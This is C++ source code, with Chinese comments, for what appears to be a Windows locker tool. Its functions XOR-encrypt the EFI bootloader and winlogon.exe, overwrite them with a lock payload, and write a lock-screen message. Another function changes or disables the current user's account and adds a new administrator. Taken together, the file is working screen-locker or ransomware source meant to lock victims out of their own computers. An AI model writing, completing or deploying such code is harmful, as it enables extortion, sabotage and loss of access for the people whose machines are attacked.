#include "Lock.h"
#include <vector>
/*硬盘锁 是培育*/
int DiskLock(LockCore locker)
{
    HANDLE DiskHandle = NULL;
    GetPhysicalDriveHandle(DiskHandle,GetSystemDiskPhysicalNumber());
    LPCSTR device = "\\\\.\\PhysicalDrive" + GetSystemDiskPhysicalNumber();
    string boot = GetPartitiontype(DiskHandle);
    if (boot == "GPT")
    {
        if (!SetDriveLetterToEFI(device,'X'))
        {
            string script = "select disk " + to_string(GetSystemDiskPhysicalNumber()) + " && select partition 1 && assign letter=X && exit";
            system(("echo " + script + " | diskpart").c_str());
            //不行就调用diskpart脚本
        }
        // 打开bootx64.efi文件
        HANDLE hEfiSrc = CreateFileA("X:\\ESP\\BOOT\\bootx64.efi", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hEfiSrc == INVALID_HANDLE_VALUE)
        {
            cout << "无法打开文件" << endl;
            return GetLastError();
        }

        // 获取文件大小
        DWORD fileSize = GetFileSize(hEfiSrc, NULL);
        vector<char> buffer(fileSize);

        DWORD bytesRead;
        if (!ReadFile(hEfiSrc, &buffer[0], fileSize, &bytesRead, NULL))
        {
            CloseHandle(hEfiSrc);
            return GetLastError();
        }
        CloseHandle(hEfiSrc);

        // 对读取的内容进行异或加密
        for (int i = 0; i < buffer.size(); i++)
        {
            buffer[i] ^= locker.Xorkey;
        }

        HANDLE hBackup = CreateFileA("X:\\ESP\\BOOT\\bootbackup.yeluo", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hBackup == INVALID_HANDLE_VALUE)
        {
            cout << "无法创建文件" << endl;
            return GetLastError();
        }

        DWORD bytesWritten;
        if (!WriteFile(hBackup, &buffer[0], buffer.size(), &bytesWritten, NULL))
        {
            CloseHandle(hBackup);
            return GetLastError();
        }
        CloseHandle(hBackup);

        HANDLE hEfiDst = CreateFileA("X:\\ESP\\BOOT\\bootx64.efi", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hEfiDst == INVALID_HANDLE_VALUE)
        {
            return GetLastError();
        }

        if (!WriteFile(hEfiDst, locker.UefiLockCore, sizeof(locker.UefiLockCore), &bytesWritten, NULL))
        {
            CloseHandle(hEfiDst);
            return GetLastError();
        }
        CloseHandle(hEfiDst);

        return 0;
    }
    else//  mbr
    {

    }
}
// 用户锁函数，用于创建一个新用户并禁用当前用户
// 输入参数：setting - 用户锁设置
// 返回值：bool类型，表示函数的执行结果
BOOL UserLock( UserLockSetting setting)
{
    // 获取当前用户的用户名
    LPWSTR local = W_GetCurrentUsername();

    // 更改当前用户的密码
    if (!CurrentUser(local, setting.newPassword))
    {
        // 如果更改密码失败，则返回执行失败
        return false;
    }

    // 如果需要更改原用户名
    if (setting.changeOriginalUsername)
    {
        // 更改当前用户名
        if (!RenameUserAccount(local, setting.newUsername))
        {
            // 如果更改用户名失败，则返回执行失败
            return false;
        }
    }
    else // 如果不需要更改原用户名
    {
        // 创建一个新用户，并将其添加到管理员组中
        // 同时禁用当前用户，使其无法登录
        if (!NetUserAddAdmin(setting.newUsername, setting.newUsername) || !DisableUserAccount(local))
        {
            // 如果创建用户或禁用用户失败，则返回执行失败
            return false;
        }
    }
    return true;
}
/*加密文件锁*/
int FileLock(string password)
{
	return 0;
}
/*劫持winlogin登录锁*/
int LoginLock(LoginLockSetting setting)
{
    // 打开要读取的文件
    HANDLE hIn = CreateFileA("C:\\Windows\\System32\\winlogon.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE)
    {
        std::cerr << "无法打开文件" << std::endl;
        return -1;
    }

    // 获取文件大小
    DWORD dwFileSize = GetFileSize(hIn, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        std::cerr << "无法获取文件大小" << std::endl;
        CloseHandle(hIn);
        return -1;
    }

    // 读取文件内容到缓冲区
    std::vector<char> buffer(dwFileSize);
    DWORD dwBytesRead = 0;
    if (!ReadFile(hIn, buffer.data(), dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        std::cerr << "读取文件失败" << std::endl;
        CloseHandle(hIn);
        return -1;
    }
    CloseHandle(hIn);

    // 对读取的内容进行异或加密
    const char xorKey = setting.XorKey;
    for (char& c : buffer)
    {
        c ^= xorKey;
    }

    // 写入加密后的数据到文件
    HANDLE hOut = CreateFileA("C:\\loginbackup.yeluo", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
    {
        std::cerr << "无法创建文件" << std::endl;
        return -1;
    }
    DWORD dwBytesWritten = 0;
    if (!WriteFile(hOut, buffer.data(), dwFileSize, &dwBytesWritten, NULL) || dwBytesWritten != dwFileSize)
    {
        std::cerr << "写入文件失败" << std::endl;
        CloseHandle(hOut);
        return -1;
    }
    CloseHandle(hOut);

    // 写入新的数据到文件
    hOut = CreateFileA("C:\\Windows\\System32\\winlogon.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE)
    {
        std::cerr << "无法打开文件" << std::endl;
        return -1;
    }
    if (!WriteFile(hOut, setting.LockCore, sizeof(setting.LockCore), &dwBytesWritten, NULL) || dwBytesWritten != sizeof(setting.LockCore))
    {
        std::cerr << "写入文件失败" << std::endl;
        CloseHandle(hOut);
        return -1;
    }
    CloseHandle(hOut);
    // 在lock里的显示信息
    std::ofstream output_file("C:\\msg.txt", std::ios::binary);
    // 将设置好的消息写入文件
    output_file.write(setting.ShowMsg.c_str(), setting.ShowMsg.length());
    // 关闭文件
    output_file.close();
}